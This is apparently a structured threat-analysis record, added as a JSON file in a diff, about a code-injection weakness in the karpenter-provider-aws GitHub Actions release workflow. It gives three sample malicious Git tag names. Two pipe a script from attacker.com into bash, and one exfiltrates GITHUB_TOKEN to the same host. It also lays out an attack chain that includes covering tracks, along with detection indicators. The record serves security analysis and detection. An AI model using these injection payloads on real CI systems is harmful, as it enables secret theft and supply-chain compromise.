@@ -1,0 +1,141 @@
+{
+  "package_info": {
+    "package_name": "karpenter-provider-aws",
+    "package_manager": "GitHub (source repository, not a package manager)",
+    "package_versions": "All versions prior to mitigation (before Nov 24, 2023)",
+    "why_malicious": "The repository's GitHub Actions workflow was vulnerable to code injection via maliciously crafted Git tags or branch names. This allowed insiders with write access to achieve remote code execution (RCE) in the CI environment, exfiltrate secrets, and tamper with release artifacts, posing a severe supply chain risk."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "ci-cd (GitHub Actions workflow triggered on tag push)",
+        "file_location": ".github/workflows/release.yaml",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "A malicious Git tag such as: v1.2.3'; curl https://attacker.com/evil.sh | bash; echo '",
+      "code_language": "shell (injected via workflow YAML interpreted as shell/JS)",
+      "code_behavior": "When a tag is pushed, the workflow parses the tag name in a shell or JavaScript context, allowing injected code to execute arbitrary shell commands (e.g., download and execute a remote script), leading to RCE and potential exfiltration of secrets.",
+      "malice_analysis": {
+        "why_suspicious": "The code allows user-controlled input (the tag name) to be interpreted as executable code in the CI environment, enabling arbitrary command execution.",
+        "violated_expectations": "Normally, tag names are treated as data, not as code. Here, the workflow fails to sanitize tag input, allowing code injection.",
+        "similar_legitimate_use": "Legitimate workflows may use tag names for versioning or release notes, but never as executable code.",
+        "key_indicators": [
+          "User-controlled tag name used in shell/JS context",
+          "No input sanitization or escaping",
+          "Ability to inject shell commands via tag"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "ci-cd (GitHub Actions workflow triggered on tag push)",
+        "file_location": ".github/workflows/release.yaml",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "A malicious Git tag such as: v1.2.3; curl https://attacker.com/evil.sh | bash #",
+      "code_language": "shell (injected via workflow YAML interpreted as shell)",
+      "code_behavior": "When a tag is pushed, the workflow step that uses the tag name in a shell command executes the injected payload, which downloads and runs a remote script, enabling the attacker to run arbitrary code in the CI environment.",
+      "malice_analysis": {
+        "why_suspicious": "The workflow step directly interpolates the tag name into a shell command, allowing attackers to break out of the intended context and execute arbitrary commands.",
+        "violated_expectations": "Workflows should treat tag names as untrusted input and never execute them as code.",
+        "similar_legitimate_use": "None; tag names should never be executed as code.",
+        "key_indicators": [
+          "Shell command injection via tag name",
+          "No input validation or escaping",
+          "Remote script execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "ci-cd (GitHub Actions workflow triggered on tag push)",
+        "file_location": ".github/workflows/release.yaml",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "A malicious Git tag such as: v1.2.3'; fetch('https://attacker.com/steal?token='+process.env.GITHUB_TOKEN)//",
+      "code_language": "javascript (injected via workflow YAML interpreted as JS)",
+      "code_behavior": "When a tag is pushed, the workflow step that uses the tag name in a JavaScript context executes the injected payload, which exfiltrates the GITHUB_TOKEN environment variable to an external server.",
+      "malice_analysis": {
+        "why_suspicious": "The workflow allows tag names to be interpreted as JavaScript code, enabling attackers to access secrets and exfiltrate them.",
+        "violated_expectations": "Tag names should never be executed as code, especially not in a context where secrets are accessible.",
+        "similar_legitimate_use": "None; tag names should be treated as data only.",
+        "key_indicators": [
+          "JavaScript code injection via tag name",
+          "Access to environment variables (GITHUB_TOKEN)",
+          "Network exfiltration of secrets"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Insider with write access crafts a malicious Git tag or branch name containing injected shell or JavaScript code.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Triggering the vulnerable GitHub Actions workflow"
+    },
+    {
+      "step": 2,
+      "action": "Malicious tag is pushed to the repository, triggering the workflow (e.g., release.yaml) that uses the tag name in an unsanitized context.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Execution of injected code in the CI environment"
+    },
+    {
+      "step": 3,
+      "action": "Injected code executes in the GitHub Actions runner, enabling arbitrary code execution, exfiltration of secrets (e.g., GITHUB_TOKEN, AWS OIDC credentials), and tampering with release artifacts.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Attacker achieves RCE, secrets exfiltration, and supply chain compromise"
+    },
+    {
+      "step": 4,
+      "action": "Attacker deletes the malicious tag and/or workflow logs to cover tracks, leaving minimal evidence.",
+      "implemented_by": [],
+      "leads_to": "Anti-forensics and persistence (if evergreen scenario exploited)"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "GitHub Actions workflow triggered by tag or branch push with tag/branch name used in shell or JavaScript context",
+      "Unexpected network requests from CI runners during workflow execution",
+      "Access to sensitive environment variables (GITHUB_TOKEN, AWS credentials) followed by network exfiltration",
+      "Creation and immediate deletion of unusual tags or branches"
+    ],
+    "file_indicators": [
+      ".github/workflows/release.yaml",
+      "Workflows that interpolate github.ref, github.ref_name, or similar variables directly into shell or JS code",
+      "Unusual or recently created tags/branches with suspicious names"
+    ],
+    "network_indicators": [
+      "Outbound connections from CI runners to untrusted domains (e.g., attacker-controlled servers)",
+      "Exfiltration attempts of secrets via HTTP(S) requests",
+      "Unexpected use of curl, wget, or fetch in workflow logs"
+    ],
+    "how_to_detect": "Monitor GitHub Actions workflows for steps that use tag or branch names in shell or JavaScript contexts without proper sanitization. Flag workflows that interpolate github.ref or similar variables into executable code. Audit for creation and rapid deletion of tags/branches, especially those with unusual or non-standard names. Monitor CI runner network activity for outbound requests to untrusted domains and for exfiltration of environment variables or secrets. Review workflow logs for evidence of command injection or unexpected script execution."
+  }
+}
